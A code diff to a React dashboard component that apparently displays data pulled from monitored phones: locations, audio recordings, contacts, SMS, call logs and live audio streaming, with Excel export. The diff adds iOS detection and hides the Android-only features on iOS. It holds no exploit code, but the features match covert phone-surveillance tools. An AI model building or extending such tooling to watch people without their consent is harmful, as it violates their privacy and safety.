@@ -20,7 +20,8 @@ const DeviceDetail = ({ user }) => {
   const [deviceExtendedInfo, setDeviceExtendedInfo] = useState({
     android_id: null,
     phone_numbers: [],
-    contacts: []
+    contacts: [],
+    platform: 'android'
   });
   const [recordingStatus, setRecordingStatus] = useState(null);
   const [showRenameModal, setShowRenameModal] = useState(false);
@@ -43,6 +44,9 @@ const DeviceDetail = ({ user }) => {
   const initialPhoneNumbers = useMemo(() => {
     return phoneNumbers.length > 0 ? phoneNumbers : (deviceExtendedInfo.phone_numbers || []);
   }, [phoneNumbers, deviceExtendedInfo.phone_numbers]);
+
+  const isIOS = (deviceInfo?.platform === 'ios') || (deviceExtendedInfo?.platform === 'ios');
+  const identifierLabel = isIOS ? 'UUID' : 'Android ID';
 
   // Real-time polling
   useEffect(() => {
@@ -97,7 +101,8 @@ const DeviceDetail = ({ user }) => {
           setDeviceExtendedInfo({
             android_id: null,
             phone_numbers: [],
-            contacts: []
+            contacts: [],
+            platform: 'android'
           });
         }
 
@@ -412,6 +417,9 @@ const DeviceDetail = ({ user }) => {
         </button>
         <div className="device-title">
           <h1>📱 {deviceInfo?.display_name || deviceId}</h1>
+          <div className={`device-platform-badge ${isIOS ? 'ios' : 'android'}`}>
+            {isIOS ? ' iPhone' : '🤖 Android'}
+          </div>
           
           {/* Battery Indicator */}
           {deviceExtendedInfo?.battery?.level !== null && deviceExtendedInfo?.battery?.level !== undefined && (
@@ -559,7 +567,7 @@ ${deviceExtendedInfo.battery.last_updated ? `Updated: ${new Date(deviceExtendedI
               <div className="export-info">
                 <p><strong>Device:</strong> {deviceInfo?.display_name || deviceId}</p>
                 <p><strong>Export Format:</strong> Excel (.xlsx)</p>
-                <p><strong>Data Included:</strong> Locations, Recordings, Contacts</p>
+                <p><strong>Data Included:</strong> {isIOS ? 'Locations, Recordings (iOS: other tabs included for structure only)' : 'Locations, Recordings, Contacts, SMS, Call Logs'}</p>
               </div>
               
               <div className="form-group">
@@ -658,7 +666,7 @@ ${deviceExtendedInfo.battery.last_updated ? `Updated: ${new Date(deviceExtendedI
               <span className="item-value">{deviceInfo?.last_seen || 'Never'}</span>
             </div>
             <div className="summary-item">
-              <span className="item-label">Android ID:</span>
+              <span className="item-label">{identifierLabel}:</span>
               <span className="item-value">{deviceExtendedInfo.android_id || 'Not available - Device not synced'}</span>
             </div>
           </div>
@@ -676,22 +684,26 @@ ${deviceExtendedInfo.battery.last_updated ? `Updated: ${new Date(deviceExtendedI
                 />
               </div>
             </div>
-            <div className="summary-item">
-              <span className="item-label">Phone Numbers:</span>
-              <div className="item-value">
-                {renderPhoneNumbers()}
+            {!isIOS && (
+              <div className="summary-item">
+                <span className="item-label">Phone Numbers:</span>
+                <div className="item-value">
+                  {renderPhoneNumbers()}
+                </div>
               </div>
-            </div>
-            <div className="summary-item">
-              <button 
-                className="summary-btn btn-contacts" 
-                onClick={handleViewContacts}
-                title={deviceExtendedInfo.contacts?.length === 0 ? "No contacts available - Device needs to sync" : ""}
-              >
-                📞 View Contacts ({deviceExtendedInfo.contacts?.length || 0})
-                {deviceExtendedInfo.contacts?.length === 0 && <span className="sync-indicator"> - Not synced</span>}
-              </button>
-            </div>
+            )}
+            {!isIOS && (
+              <div className="summary-item">
+                <button 
+                  className="summary-btn btn-contacts" 
+                  onClick={handleViewContacts}
+                  title={deviceExtendedInfo.contacts?.length === 0 ? "No contacts available - Device needs to sync" : ""}
+                >
+                  📞 View Contacts ({deviceExtendedInfo.contacts?.length || 0})
+                  {deviceExtendedInfo.contacts?.length === 0 && <span className="sync-indicator"> - Not synced</span>}
+                </button>
+              </div>
+            )}
             <div className="summary-item">
               <button 
                 className="summary-btn btn-location-table" 
@@ -708,22 +720,26 @@ ${deviceExtendedInfo.battery.last_updated ? `Updated: ${new Date(deviceExtendedI
                 🎵 Audio Recordings
               </button>
             </div>
-            <div className="summary-item">
-              <button 
-                className="summary-btn btn-sms-table" 
-                onClick={handleViewSmsTable}
-              >
-                💬 SMS Messages
-              </button>
-            </div>
-            <div className="summary-item">
-              <button 
-                className="summary-btn btn-call-logs-table" 
-                onClick={handleViewCallLogsTable}
-              >
-                📞 Call Logs
-              </button>
-            </div>
+            {!isIOS && (
+              <div className="summary-item">
+                <button 
+                  className="summary-btn btn-sms-table" 
+                  onClick={handleViewSmsTable}
+                >
+                  💬 SMS Messages
+                </button>
+              </div>
+            )}
+            {!isIOS && (
+              <div className="summary-item">
+                <button 
+                  className="summary-btn btn-call-logs-table" 
+                  onClick={handleViewCallLogsTable}
+                >
+                  📞 Call Logs
+                </button>
+              </div>
+            )}
             {/* External Storage button - hidden but implementation preserved */}
             <div className="summary-item" style={{ display: 'none' }}>
               <button 
@@ -736,9 +752,11 @@ ${deviceExtendedInfo.battery.last_updated ? `Updated: ${new Date(deviceExtendedI
           </div>
           
           {/* Live Audio Streaming Controls */}
-          <div className="device-controls-section">
-            <LiveStreamControls deviceId={deviceId} deviceInfo={deviceInfo} />
-          </div>
+          {!isIOS && (
+            <div className="device-controls-section">
+              <LiveStreamControls deviceId={deviceId} deviceInfo={deviceInfo} />
+            </div>
+          )}
         </div>
       </div>
 
